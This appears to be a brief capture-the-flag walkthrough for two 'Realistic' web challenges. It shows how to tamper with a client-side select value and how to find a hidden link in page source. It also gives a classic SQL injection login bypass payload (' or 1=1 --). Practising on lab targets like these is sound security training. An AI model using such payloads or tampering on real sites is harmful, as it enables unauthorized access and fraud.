###Realistic 1
Easiest way to do this is to abuse the select element having the values read directly from the page. Simply edit one of the values to be a large number:
```
<option value="500">5</option>
```

###Realistic 2
First step is to find the login page; opening up the source reveals a hidden link:
```
<a href="update.php"><font color="#000000">update</font></a>
```

Since we have no clues to go on, let's try some sql injection:
```
username: admin
password: ' or 1=1 --
```
